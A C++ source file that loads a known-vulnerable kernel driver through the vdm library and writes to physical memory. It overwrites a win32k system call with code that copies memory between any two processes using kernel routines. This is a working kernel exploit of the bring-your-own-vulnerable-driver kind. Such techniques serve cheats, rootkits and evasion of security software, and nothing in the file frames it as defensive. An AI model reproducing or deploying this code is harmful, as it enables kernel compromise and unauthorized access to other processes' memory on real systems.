/*
	author: CompiledCode
	comments fixed by: https://beta.openai.com/playground

	credits:
	- xeroxz for vdm
*/

// vdm by xeroxz
#include "dependencies/vdm/vdm_ctx/vdm_ctx.hpp"

// a wrapper around getting ntoskrnl exports
const auto get_ntk_export = std::bind( &util::get_kmodule_export, "ntoskrnl.exe", std::placeholders::_1, false );
const auto get_w32_export = std::bind( &util::get_kmodule_export, "win32kbase.sys", std::placeholders::_1, false );

// a structure holding data
struct data_t
{
	// imports
	using ps_lookup_process_by_process_id_t = NTSTATUS( * )( std::uint64_t, void*& );
	const ps_lookup_process_by_process_id_t ps_lookup_process_by_process_id = static_cast< ps_lookup_process_by_process_id_t >( get_ntk_export( "PsLookupProcessByProcessId" ) );

	using mm_copy_virtual_memory_t = NTSTATUS( * )( void*, void*, void*, void*, std::size_t, std::uint8_t, std::size_t& );
	const mm_copy_virtual_memory_t mm_copy_virtual_memory = static_cast< mm_copy_virtual_memory_t >( get_ntk_export( "MmCopyVirtualMemory" ) );

	using obf_dereference_object_t = void( * )( void* );
	const obf_dereference_object_t obf_dereference_object = static_cast< obf_dereference_object_t >( get_ntk_export( "ObfDereferenceObject" ) );

	// arguments
	const std::uint64_t from_pid, to_pid;
	
	void *const from_address, *const to_address;

	const std::size_t size;
};

// the function that will be mapped into the driver
NTSTATUS mapped( const data_t& data )
{
	void* from_process = nullptr, *to_process = nullptr;
	
	// obtain the process objects
	if ( !NT_SUCCESS( data.ps_lookup_process_by_process_id( data.from_pid, from_process ) ) || !NT_SUCCESS( data.ps_lookup_process_by_process_id( data.to_pid, to_process ) ) )
		return STATUS_INVALID_PARAMETER;

	// copy the memory
	std::size_t size;
	if ( !NT_SUCCESS( data.mm_copy_virtual_memory( from_process, data.from_address, to_process, data.to_address, data.size, 1, size ) ) )
		return STATUS_INVALID_PARAMETER;

	// dereference the objects
	data.obf_dereference_object( from_process );
	data.obf_dereference_object( to_process );

	return STATUS_SUCCESS;
}

int main( )
{
	{
		// establish a handle to the vulnerable driver, and wrap it using unique_ptr to close the handle when the scope dies
		std::unique_ptr< std::remove_pointer_t< HANDLE >, decltype( &vdm::unload_drv ) > driver{ vdm::load_drv( ), &vdm::unload_drv };

		// the actual vdm instance
		vdm::vdm_ctx vdm{};

		// the function that will be overwritten
		const auto function = get_w32_export( "NtMapVisualRelativePoints" );

		// obtain the physical address of the function
		using mm_get_physical_address_t = PHYSICAL_ADDRESS( * )( void* );
		const auto physical_address = vdm.syscall< mm_get_physical_address_t >( get_ntk_export( "MmGetPhysicalAddress" ), function );

		// map the function
		vdm::write_phys( reinterpret_cast< void* >( physical_address.QuadPart ), &mapped, 0x1D1 );
	}

	// load user32
	std::unique_ptr< std::remove_pointer_t< HMODULE >, decltype( &FreeLibrary ) > user32{ LoadLibraryA( "user32.dll" ), &FreeLibrary };

	// load win32u
	std::unique_ptr< std::remove_pointer_t< HMODULE >, decltype( &FreeLibrary ) > win32u{ LoadLibraryA( "win32u.dll" ), &FreeLibrary };

	const auto function = GetProcAddress( win32u.get( ), "NtMapVisualRelativePoints" );

	// test variables
	auto test_variable_one = 0xDEAD;
	auto test_variable_two = 0xBEEF;

	// initialize the data structure
	data_t data
	{
		.from_pid = GetCurrentProcessId( ),
		.to_pid = GetCurrentProcessId( ),

		.from_address = &test_variable_one,
		.to_address = &test_variable_two,
		
		.size = sizeof( int )
	};
	
	// test the function
	std::printf( "[+] before: %0X\n", test_variable_two );
	std::printf( "[+] result: %i\n", reinterpret_cast< decltype( &mapped ) >( function )( data ) );
	std::printf( "[+] after: %0X\n", test_variable_two );

	return std::getchar( );
}